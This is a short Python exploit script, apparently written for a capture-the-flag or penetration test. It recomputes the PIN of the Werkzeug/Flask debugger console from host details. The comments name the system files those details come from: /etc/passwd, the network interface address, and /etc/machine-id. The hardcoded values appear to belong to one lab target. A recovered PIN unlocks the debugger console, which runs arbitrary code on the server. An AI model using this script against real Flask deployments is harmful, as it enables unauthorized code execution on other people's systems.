import hashlib
from itertools import chain
from colorama import Fore, Style

username = "web-app" # username, can be found in /etc/passwd
modname = "flask.app" # modname
appname = "Flask" # getattr(app, '__name__', getattr(app.__class__, '__name__'))
path = "/home/web-app/.local/lib/python3.11/site-packages/flask/app.py" # getattr(mod, '__file__', None)

mac = "02:42:ac:10:00:26" # value from /sys/class/net/<device-id>/address
mch_id = "ec81ef37-14b2-4201-827d-f0811d43866a" # value from /etc/machine-id


# Convert MAC address to integer
mac = int("".join(mac.split(":")),16)

probably_public_bits = [username,modname,appname,path]
private_bits = [str(mac), mch_id]

rv = None
num = None
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode("utf-8")
	h.update(bit)
h.update(b"cookiesalt")


if num is None:
	h.update(b"pinsalt")
	num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = "-".join(
				num[x : x + group_size].rjust(group_size, "0")
				for x in range(0, len(num), group_size)
			)
			break
	else:
		rv = num

print(f"[+] Generated PIN: {rv}\n")